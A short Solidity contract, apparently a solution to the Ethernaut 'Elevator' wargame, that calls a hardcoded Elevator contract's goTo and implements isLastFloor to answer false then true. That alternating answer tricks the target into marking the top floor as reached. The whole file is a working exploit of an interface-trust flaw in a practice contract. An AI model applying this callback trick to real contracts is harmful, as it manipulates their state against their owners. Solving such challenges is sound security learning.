//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract BuildingS {
    Elevator public elevator =
        Elevator(0x8af6F27cB529f2e4e7a57E68F4a9fE472e24f7e6);
    bool internal the_switch = false;

    function toTheTop(uint _floor) public {
        elevator.goTo(_floor);
    }

    function isLastFloor(uint) external returns (bool) {
        if (the_switch == false) {
            the_switch = true;
            return false;
        } else {
            the_switch = false;
            return true;
        }
    }
}
